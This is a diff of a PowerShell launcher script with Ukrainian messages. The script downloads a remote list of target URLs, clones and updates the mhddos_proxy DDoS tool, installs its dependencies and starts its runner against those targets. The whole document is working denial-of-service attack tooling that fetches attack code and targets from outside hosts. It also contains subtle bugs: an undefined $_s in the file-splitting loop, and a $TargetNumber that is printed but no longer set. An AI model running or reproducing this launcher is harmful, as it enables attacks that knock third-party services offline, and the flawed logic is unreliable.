@@ -23,31 +23,55 @@ Write-Host ""
 Write-MidleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 $TargetsList = ( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
-    Where-Object { ( $_ -notlike '#*' ) -or ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
+    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
     Foreach-Object {$_ -split " "} | Sort-Object -Unique
 
-# create target files with 360 entries or less
-$TargetNumber = $TargetsList.Length
-$TargetsList > "$RootPath\tmp\xaa.uaripper"
+# create files with targets
+$TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
+$NumberOfTargetsFiles = $TargetFiles.Length
+$NumberOfTargets = $TargetsList.Length
+
+# little math to calculate number of entries in one file
+
+$LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)
+
+for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
+    $s = $i * $LnInFile
+    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($_s + $LnInFile - 1) : ($NumberOfTargets)
+    # workaround to save targets without empty line in the end of file as Unix(LF)
+    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])"
+}
+
 Write-MidleHost "Знайдено $TargetNumber цілей" -Here
 $TargetsList = $null
 
 Write-MidleHost "Завантаження mhddos_proxy" -NoNewline
 $RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
 if (Test-Path -Path $LocalMhddosProxy) {
-    &"$RootPath\Git\cmd\git.exe" -C $LocalMhddosProxy pull --quiet >nul 2>&1
+    &"$RootPath\Git\cmd\git.exe" -C $LocalMhddosProxy pull --quiet
     $message = "mhddos_proxy було оновлено!"
 }
 else {
-    &"$RootPath\Git\cmd\git.exe" clone "$RemoteMhddosProxy" "$LocalMhddosProxy" --quiet >nul 2>&1
+    &"$RootPath\Git\cmd\git.exe" clone "$RemoteMhddosProxy" "$LocalMhddosProxy" --quiet
     $message = "mhddos_proxy було встановлено!"
 }
 Write-MidleHost $message -Here -NoNewline
 
 Write-MidleHost "Створення і активація віртуального оточення" -Here -NoNewline
 &"$PyPath\python.exe" -m virtualenv $VenvPath --quiet
-&"$VenvPath\Scripts\activate.ps1" >nul 2>&1
+&"$VenvPath\Scripts\activate.ps1"
 
 Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
-&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet >nul 2>&1
+&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
 Write-MidleHost "Запуск mhddos_proxy" -Here -NoNewline
+
+$BackgroundJob = { 
+    $StartParams = @{
+        'FilePath' = "$PyPath\python.exe"
+        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $FilePath $threads $methods"
+        'NoNewWindow' = $true
+        'PassThru' = $true
+        'Wait' = $true
+    }
+    Start-Process @StartParams
+}
